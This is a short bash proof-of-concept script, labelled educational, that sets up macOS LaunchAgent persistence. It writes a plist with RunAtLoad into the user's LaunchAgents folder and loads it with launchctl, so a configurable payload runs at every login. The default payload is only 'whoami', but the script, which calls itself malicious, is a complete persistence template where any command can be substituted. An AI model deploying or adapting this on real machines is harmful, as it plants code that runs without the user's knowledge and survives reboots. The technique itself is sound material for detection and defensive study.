#!/bin/bash
# ------------
# macOS LaunchAgent PoC – Educational Use Only
# Writes a LaunchAgent .plist file that executes a payload (default: `whoami`)
# upon load or user login via launchctl.
# Permit execution with: chmod +x poc.sh
# Run: ./poc.sh
# Author: SentinelByte
# Version: 1.04
# ------------

# Configuration
# Name of the LaunchAgent .plist
PLIST_NAME="com.user.launchdemo.plist"

# Full path to where the .plist will be written (per-user LaunchAgents dir)
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"

# Command to be executed by the LaunchAgent on load (PoC: harmless `whoami`)
PAYLOAD="/usr/bin/whoami"

# Main Logic
echo "[*] Writing malicious LaunchAgent plist to: $PLIST_PATH"

# Generate the .plist file with appropriate XML structure
cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.launchdemo</string>

    <key>ProgramArguments</key>
    <array>
        <string>$PAYLOAD</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

echo "[+] LaunchAgent plist written."

# Attempt to load the LaunchAgent via launchctl
echo "[*] Loading LaunchAgent using launchctl (output from payload should follow):"
launchctl load "$PLIST_PATH"

# Optional cleanup instruction
# echo "[*] To remove this LaunchAgent, run: launchctl unload '$PLIST_PATH' && rm '$PLIST_PATH'"
